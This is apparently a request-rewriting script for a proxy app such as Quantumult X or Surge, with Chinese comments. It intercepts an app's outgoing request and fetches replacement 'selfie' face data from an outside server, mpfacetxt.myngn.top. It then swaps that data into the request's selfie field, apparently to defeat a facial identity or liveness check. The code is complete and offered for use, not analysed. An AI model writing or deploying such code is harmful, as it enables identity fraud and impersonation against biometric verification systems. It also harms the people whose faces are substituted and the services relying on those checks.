(async () => {
    let body = $request.body;
    let bodyObj = JSON.parse(body);

    // 调试输出原始请求体
    console.log("Original Request Body:", bodyObj);

    // 1. 发送请求以获取新的selfie数据
    const getNewSelfie = async () => {
        const url = "https://mpfacetxt.myngn.top/getChipperContent.php";
        const requestBody = JSON.stringify({
            "request_chipper": true
        });

        try {
            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: requestBody
            });

            const data = await response.json();

            // 调试输出从服务器获取的数据
            console.log("Received Response:", data);

            if (data.status === "success" && data.file_content) {
                return data.file_content;
            } else {
                console.error("Failed to fetch new selfie data:", data.message);
                return null;
            }
        } catch (error) {
            console.error("Error occurred while fetching new selfie:", error);
            return null;
        }
    };

    // 2. 替换请求体中的selfie字段
    const newSelfie = await getNewSelfie();

    if (newSelfie) {
        // 如果获取到了新的人脸数据，替换selfie字段
        if (bodyObj.selfie) {
            bodyObj.selfie = newSelfie;
            console.log("Selfie replaced with new data.");
        }

        // 将修改后的JSON对象转回字符串
        body = JSON.stringify(bodyObj);

        // 调试输出修改后的请求体
        console.log("Modified Request Body:", body);

        // 返回修改后的请求体
        $done({ body });
    } else {
        console.error("No new selfie data received, sending original request.");
        // 如果没有获取到新人脸数据，保持原始body
        $done({ body });
    }
})();
